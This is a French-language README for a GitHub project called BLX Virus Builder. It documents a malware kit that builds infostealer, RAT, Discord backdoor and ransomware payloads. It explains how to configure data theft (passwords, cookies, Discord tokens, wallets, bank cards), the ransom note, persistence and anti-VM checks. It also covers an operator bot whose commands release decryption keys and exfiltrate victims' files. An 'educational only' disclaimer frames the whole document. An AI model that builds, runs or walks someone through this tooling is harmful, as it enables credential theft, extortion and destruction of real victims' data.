<p align="center">
  <img src="Img/BLX_icon.ico" alt="BLX Icon" width="80" height="80">
</p>

# BLX - Virus Builder

> **Outil Virus Builder de BLX** — Tout ce dont le builder a besoin est dans ce dossier.

[![GitHub](https://img.shields.io/badge/GitHub-BenzoXdev%2FBlx--Virus--Builder-181717?style=flat-square&logo=github)](https://github.com/BenzoXdev/Blx-Virus-Builder)
[![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/Usage-Educational%20Only-red?style=flat-square)]()

| Lien | Description |
|------|-------------|
| **Projet** | [Blx-Virus-Builder](https://github.com/BenzoXdev/Blx-Virus-Builder) |
| **Auteur** | [BenzoXdev](https://github.com/BenzoXdev) |

---

## ⚠️ Avertissement / Disclaimer

<div align="center">

**Cet outil est fourni à des fins éducatives et de recherche en cybersécurité uniquement.**

</div>

### Limitation de responsabilité — Exonération totale

L'auteur, les contributeurs et les mainteneurs de ce projet **déclinent toute responsabilité** et **s'exonèrent entièrement** de toute obligation légale, pénale, civile ou contractuelle relative à :

- L'**usage** de ce logiciel, qu'il soit licite ou illicite ;
- Tout **dommage** direct ou indirect causé par l'utilisation de cet outil ;
- Toute **poursuite judiciaire**, **amende**, **sanction** ou **condamnation** découlant de l'utilisation de ce logiciel ;
- Toute **violation de loi** (accès non autorisé, atteinte aux systèmes, vol de données, etc.) commise par l'utilisateur ;
- Tout **contenu** ou **données** exfiltrées, chiffrées ou modifiées via cet outil.

**En utilisant ce logiciel, vous acceptez :**

- De l'utiliser **uniquement** dans un cadre légal (tests autorisés, pentest, recherche académique) ;
- D'être **seul responsable** de vos actes et de leurs conséquences juridiques ;
- Que l'auteur **ne peut en aucun cas** être tenu pour responsable de vos agissements.

Toute utilisation de ce logiciel pour attaquer des systèmes sans autorisation explicite est **interdite** et punie par la loi. **L'auteur décline toute responsabilité** en cas de mauvaise utilisation.

📄 **Voir [DISCLAIMER.md](DISCLAIMER.md)** pour l'avertissement légal complet.

---

## 📑 Sommaire

1. [Aperçu](#-aperçu)
2. [Schéma de fonctionnement](#-schéma-de-fonctionnement)
3. [Interface du Builder](#-interface-du-builder)
4. [Installation rapide](#-installation-rapide)
5. [Structure du projet](#-structure-du-projet)
6. [Utilisation du builder](#-utilisation-du-builder)
7. [Options Stealer](#-options-stealer)
8. [Options Malware](#-options-malware)
9. [Config RAT et Backdoor](#-config-rat-et-backdoor)
10. [Option Ransomware](#-option-ransomware)
11. [Config Ransomware dans le builder](#-config-ransomware-dans-le-builder)
12. [Déchiffreur (BLX_Decryptor)](#-déchiffreur-blx_decryptor)
13. [Bot Discord (BLX_Ransomware_Bot)](#-bot-discord-blx_ransomware_bot)
14. [Configuration du bot](#-configuration-du-bot)
15. [Build du déchiffreur en EXE](#-build-du-déchiffreur-en-exe)
16. [Sortie des builds](#-sortie-des-builds)
17. [Dépendances](#-dépendances)

---

## 🎯 Aperçu

**BLX Virus Builder** est un outil graphique (GUI) permettant de créer des payloads personnalisés à des fins de tests de sécurité et de recherche en cybersécurité. Il combine des modules **Stealer** (vol de données), **Malware** (actions perturbatrices), **RAT**, **Backdoor** et **Ransomware** en un seul build configurable.

### Fonctionnalités principales

| Catégorie | Description |
|-----------|-------------|
| **Stealer** | Mots de passe, cookies, sessions Discord, wallets, etc. |
| **Malware** | Blocage clavier/souris, popup, shutdown, anti-VM, etc. |
| **RAT** | Contrôle à distance via Discord |
| **Backdoor** | Shell à distance via Discord |
| **Ransomware** | Chiffrement .blx + déchiffreur + bot opérateur |

---

## 🔄 Schéma de fonctionnement

Le flux complet du builder, de la configuration à la sortie :

![Architecture BLX Virus Builder](Img/architecture.png)

### Processus de build détaillé

![Processus de build](Img/build-process.png)

| Étape | Description |
|-------|-------------|
| **1. Configuration** | Saisie du Webhook Discord, options cochées |
| **2. Modules Stealer** | Passwords, Cookies, Discord, Wallets, etc. |
| **3. Modules Malware** | Block keys, RAT, Backdoor, Ransomware |
| **4. Compilation** | PyInstaller (pour .exe) ou script Python brut |
| **5. Sortie** | Fichiers dans `1-Output/VirusBuilder/` |

---

## 🖥️ Interface du Builder

Aperçu de l'interface graphique principale :

![Interface du Builder](Img/builder-interface.png)

L'interface offre des onglets pour les options **Stealer** et **Malware**, un champ Webhook, des cases à cocher pour chaque module, et un bouton **Build** pour générer le payload.

---

## ⚡ Installation rapide

```bash
# 1. Cloner le dépôt
git clone https://github.com/BenzoXdev/Blx-Virus-Builder.git
cd Blx-Virus-Builder

# 2. Installer les dépendances
pip install -r requirements.txt

# 3. Lancer le builder
python Virus-Builder.py
```

**Windows :** vous pouvez utiliser `run.bat` ou `setup.bat` si fournis.

---

## 📁 Structure du projet

```
Virus Builder/
├── Virus-Builder.py              # Point d'entrée : lancer ce fichier
├── Config/
│   ├── __init__.py
│   ├── Config.py                 # Configuration (nom, version, etc.)
│   └── Util.py                   # Utilitaires (banner, couleurs, Reset, etc.)
├── FileDetectedByAntivirus/
│   ├── __init__.py
│   ├── BuilderOptions.py         # Briques du build : CORE, STEALER, MALWARE, DISCORD
│   └── blxOP/                    # (optionnel)
├── Ransomware/
│   ├── BLX_Decryptor.py          # Déchiffreur .blx (donner à la victime avec la clé)
│   ├── BLX_Ransomware_Bot.py     # Bot Discord : !key, !keys, !exfil, !info, !decryptor
│   ├── BLX_ransomware_bot_config.example.json
│   ├── build_decryptor_exe.bat   # Compile BLX_Decryptor en EXE
│   └── README.md                 # Référence rapide Ransomware
├── Img/
│   ├── BLX_icon.ico
│   ├── 7752569.ico
│   ├── architecture.png          # Schéma de fonctionnement
│   ├── build-process.png         # Processus de build
│   └── builder-interface.png     # Aperçu de l'interface
├── 1-Output/
│   └── VirusBuilder/             # Sortie des builds + BLX_ransomware_keys.json
├── requirements.txt
├── run.bat
├── setup.bat
└── README.md
```

---

## 🛠️ Utilisation du builder

1. **Webhook Discord** : saisir l'URL du webhook (obligatoire) et tester si besoin.
2. **Options** : cocher les modules souhaités (Stealer et/ou Malware), voir [Options Stealer](#-options-stealer) et [Options Malware](#-options-malware).
3. **Configs optionnelles** : pour RAT, Backdoor ou Ransomware, cocher l'option puis valider la fenêtre de config qui s'ouvre.
4. **Build** :
   - **Nom du fichier** : nom du futur .py ou .exe.
   - **Type** : **Python File** (.py) ou **Exe File** (.exe).
   - **Icône** : choisir un .ico (surtout pour Exe File).
5. Cliquer sur **Build** ; les fichiers sont créés dans `1-Output/VirusBuilder/`.

---

## 📦 Options Stealer

| Option | Description |
|--------|-------------|
| System Info | Informations système (OS, CPU, RAM, etc.) |
| Wallets Session Files | Fichiers de session des portefeuilles crypto |
| Games Session Files | Fichiers de session des launchers de jeux |
| Telegram Session Files | Fichiers de session Telegram |
| Roblox Accounts | Comptes Roblox |
| Discord Accounts | Comptes Discord (tokens, etc.) |
| Discord Injection | Injection dans le client Discord |
| Passwords | Mots de passe navigateurs |
| Cookies | Cookies navigateurs |
| Browsing History | Historique de navigation |
| Download History | Historique des téléchargements |
| Cards | Cartes bancaires enregistrées |
| Extentions | Extensions de navigateurs |
| Interesting Files | Fichiers jugés intéressants |
| Webcam | Capture webcam |
| Screenshot | Capture d'écran |

---

## 🦠 Options Malware

| Option | Description |
|--------|-------------|
| Block Key | Bloquer le clavier |
| Block Mouse | Bloquer la souris |
| Block Task Manager | Bloquer le Gestionnaire des tâches |
| Block AV Website | Bloquer l'accès à des sites d'antivirus |
| Shutdown | Éteindre la machine |
| Message Popup | Afficher une fenêtre (titre, message, type : info/warning/error/question) |
| Spam Open Program | Ouvrir en boucle des programmes |
| Spam Create File | Créer des fichiers en boucle |
| Anti VM & Debug | Détection VM / debug (ne pas exécuter dans certains environnements) |
| Launch at Startup | Lancer au démarrage Windows |
| Restart Every 5min | Redémarrer le payload toutes les 5 minutes |
| RAT | RAT Discord (commande à distance) — config : token, server ID, persistance, admin requis |
| Backdoor (Shell) | Backdoor / shell Discord — config : token, server ID, persistance, admin requis |
| Ransomware | Chiffrement .blx + déchiffreur + bot opérateur — voir [Option Ransomware](#-option-ransomware) |

---

## 🔧 Config RAT et Backdoor

- **RAT** : cocher « RAT » puis ouvrir la config (en cliquant sur la case). Renseigner **Bot Token**, **Server ID**, optionnellement **Persistence** et **Admin required**.
- **Backdoor** : cocher « Backdoor (Shell) » puis ouvrir la config. Renseigner **Bot Token**, **Server ID**, **Persistence**, **Admin required**.

---

## 🔐 Option Ransomware

Si l'option **Ransomware** est activée au build :

- **Clés** : enregistrées dans `1-Output/VirusBuilder/BLX_ransomware_keys.json` et copiées dans `Ransomware/BLX_ransomware_keys.json`.
- **Déchiffreur** : le builder compile automatiquement **BLX_Decryptor.exe** et l'intègre au payload (déposé sur le Bureau de la victime). Compilation manuelle possible : [Build du déchiffreur en EXE](#-build-du-déchiffreur-en-exe).
- **Bot opérateur** : lancer `python Ransomware\BLX_Ransomware_Bot.py` (depuis la racine du projet). Le bot lit les clés dans `Ransomware\BLX_ransomware_keys.json` ou `1-Output\VirusBuilder\BLX_ransomware_keys.json`.
- **Config du bot** : copier `Ransomware\BLX_ransomware_bot_config.example.json` en `Ransomware\BLX_ransomware_bot_config.json` et renseigner au minimum **token** et **server_id**. Détails : [Configuration du bot](#-configuration-du-bot).

---

## ⚙️ Config Ransomware dans le builder

En cochant **Ransomware** et en ouvrant la fenêtre de config (clic sur la case), vous pouvez définir :

| Champ | Description |
|-------|-------------|
| **Ouvrir dossier Ransomware** | Bouton : ouvre le dossier `Ransomware` du projet. |
| **Bot Token** | Token du bot Discord (pour les commandes !key, etc.). |
| **Server ID** | ID du serveur Discord. |
| **Webhook URL** | Webhook pour les rapports victimes (peut être le même que le webhook principal). |
| **Exfil Bot Token** | Token du second bot (écoute victime pour !exfil). Optionnel. |
| **Exfil Channel ID** | ID du canal où le bot envoie les commandes !exfil (le payload écoute ce canal). Optionnel. |
| **Extensions exclues** | Extensions non chiffrées, séparées par des virgules. Ex. : `.exe,.dll,.sys` (vide = aucune exclusion par extension). |
| **Chemins exclus** | Chemins sous lesquels les fichiers ne sont pas chiffrés, séparés par des virgules. Ex. : `C:\Users\Public` (vide = aucun). |
| **Texte README** | Message personnalisé écrit dans `README_BLX.txt` sur le Bureau de la victime (vide = message par défaut). |
| **Délai avant chiffrement** | Délai en secondes avant de lancer le chiffrement (0 = immédiat, max 86400). |

---

## 📄 Déchiffreur (BLX_Decryptor)

**Fichier :** `Ransomware/BLX_Decryptor.py`  
À donner à la victime avec la **clé de déchiffrement** (base64, 32 octets) fournie par le bot : `!key <victim_id>`.

### Interface graphique (par défaut)

1. Coller la **clé** (base64) reçue.
2. Choisir le **dossier** à déchiffrer (par défaut : dossier utilisateur).
3. **Count .blx** : compte les fichiers `.blx` dans le dossier (calcul en arrière-plan).
4. **Decrypt .blx files** : lance le déchiffrement.
5. **Progress** : barre de progression et fichier en cours.
6. **Stop** : interrompt le déchiffrement.
7. À la fin : **rapport** (Bureau ou dossier cible), **clé mémorisée** (AppData ou à côté du script), **nettoyage** (persistance, README_BLX.txt) et **auto-suppression** du déchiffreur en cas de succès.

Fonctionnalités : progression, Stop, comptage .blx, mémorisation de la clé, rapport détaillé (succès/échecs).

### Ligne de commande (CLI)

```bash
python Ransomware/BLX_Decryptor.py --cli
```

Saisir la clé (base64) et le dossier à déchiffrer (Entrée = dossier utilisateur par défaut).

---

## 🤖 Bot Discord (BLX_Ransomware_Bot)

**Fichier :** `Ransomware/BLX_Ransomware_Bot.py`

### Lancement

Depuis la **racine du projet** (Virus Builder) :

```bash
python Ransomware\BLX_Ransomware_Bot.py
```

Le bot lit la config dans `Ransomware\BLX_ransomware_bot_config.json` et les clés dans `Ransomware\BLX_ransomware_keys.json` ou `1-Output\VirusBuilder\BLX_ransomware_keys.json`.

### Commandes

| Commande | Description |
|----------|-------------|
| `!key <victim_id>` | Envoie la clé de déchiffrement en **MP** à l'auteur de la commande. |
| `!key <victim_id> <channel_id>` | Envoie la clé dans le **canal** indiqué (au lieu des MP). |
| `!keys` | Liste les Victim ID présents dans le fichier de clés. |
| `!exfil <victim_id> <chemin_fichier>` | Envoie une commande d'exfiltration au payload de la victime (si exfil configuré). Ex. : `!exfil ABC123 C:\Users\victim\Desktop\fichier.txt` (max 8 Mo, sous `C:\Users`). |
| `!info` | Affiche l'état du bot (fichier de clés, nombre de victimes, exfil, rôles). |
| `!info <victim_id>` | Indique si une clé existe pour ce Victim ID. |
| `!decryptor` | Rappel des instructions pour la victime (utilisation de BLX_Decryptor.exe). |
| `!help` | Affiche l'aide des commandes. |

### Restriction par rôles

Si **allowed_role_ids** est renseigné dans la config, seuls les utilisateurs ayant **au moins un** de ces rôles peuvent utiliser les commandes. Sinon, tout le monde peut les utiliser.

### Log des commandes

Si **log_file** est renseigné dans la config, chaque commande est enregistrée dans ce fichier (date, commande, auteur, canal).

---

## 📋 Configuration du bot

1. Copier **`Ransomware/BLX_ransomware_bot_config.example.json`** en **`Ransomware/BLX_ransomware_bot_config.json`**.
2. Renseigner au minimum :
   - **token** : token du bot Discord.
   - **server_id** : ID du serveur Discord.
3. Optionnel :
   - **exfil_channel_id** : ID du canal où le bot envoie les commandes `!exfil` (le payload de la victime écoute ce canal).
   - **allowed_role_ids** : liste d'IDs de rôles autorisés à utiliser les commandes (vide = tous).
   - **log_file** : chemin d'un fichier pour logger les commandes (vide = pas de log fichier).

Exemple complet :

```json
{
  "token": "VOTRE_TOKEN_BOT",
  "server_id": "ID_DU_SERVEUR",
  "exfil_channel_id": "ID_CANAL_EXFIL",
  "allowed_role_ids": ["ID_ROLE_1", "ID_ROLE_2"],
  "log_file": "Ransomware/command_log.txt"
}
```

---

## 📦 Build du déchiffreur en EXE

Pour compiler **BLX_Decryptor.py** en **BLX_Decryptor.exe** (un seul fichier, sans console) :

1. Ouvrir un terminal dans le dossier **Ransomware** :
   ```bash
   cd Ransomware
   ```
2. Lancer :
   ```bash
   build_decryptor_exe.bat
   ```
   ou manuellement :
   ```bash
   python -m PyInstaller --onefile --windowed --name BLX_Decryptor --icon "..\Img\7752569.ico" --clean BLX_Decryptor.py
   ```
3. L'exécutable se trouve dans **`Ransomware\dist\BLX_Decryptor.exe`**.

Le Virus Builder peut aussi compiler et intégrer automatiquement ce déchiffreur au payload lors d'un build avec l'option Ransomware activée (dépôt sur le Bureau de la victime).

---

## 📂 Sortie des builds

- **Fichiers générés (.py ou .exe)** : **`1-Output/VirusBuilder/`**
- **Clés Ransomware** (si option activée) :
  - **`1-Output/VirusBuilder/BLX_ransomware_keys.json`**
  - Copie dans **`Ransomware/BLX_ransomware_keys.json`** pour le bot.

---

## 📚 Dépendances

Voir **`requirements.txt`**. Principales :

| Catégorie | Packages |
|-----------|----------|
| **Builder (GUI)** | colorama, cryptography, customtkinter, requests, discord.py, pyinstaller |
| **Stealer / navigateurs** | browser-cookie3, pycryptodome |
| **Système / hardware** | psutil, GPUtil, screeninfo |
| **Webcam / capture** | opencv-python, Pillow, mss |
| **Clavier / souris** | keyboard, pyautogui, pynput |
| **Audio** | sounddevice, scipy |
| **RAT / divers** | comtypes, pycaw, numpy |
| **Windows** | pywin32 |
| **Optionnels** | auto-py-to-exe, bcrypt, beautifulsoup4, selenium, etc. |

```bash
pip install -r requirements.txt
```

---

<p align="center">
  <strong>BLX Virus Builder</strong> — Usage éducatif uniquement
</p>
<p align="center">
  <a href="https://github.com/BenzoXdev/Blx-Virus-Builder">GitHub</a> •
  <a href="https://github.com/BenzoXdev">BenzoXdev</a>
</p>
